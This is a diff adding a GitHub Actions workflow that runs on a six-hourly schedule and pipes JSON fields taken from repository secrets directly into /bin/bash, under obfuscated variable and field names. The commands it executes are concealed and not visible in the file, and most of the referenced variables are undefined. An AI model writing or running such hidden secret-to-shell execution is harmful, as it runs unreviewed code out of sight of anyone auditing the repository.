@@ -1,0 +1,23 @@
+name: nianqingrenbandeng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nianqingrenbandeng
+        env:
+          o25961: ${{ secrets.o25961 }}
+        run: |
+          echo $o25961 | jq -r .tlzw922 | /bin/bash
+          echo $toyoi73890 | jq -r .voctc5144 | /bin/bash
+          echo $dhvwu5 | jq -r .trb775 | /bin/bash
+          echo $cziog35526 | jq -r .kz78803 | /bin/bash
+          echo $cu49983 | jq -r .xblc6682 | /bin/bash
+          echo $p6 | jq -r .rgru7 | /bin/bash
+
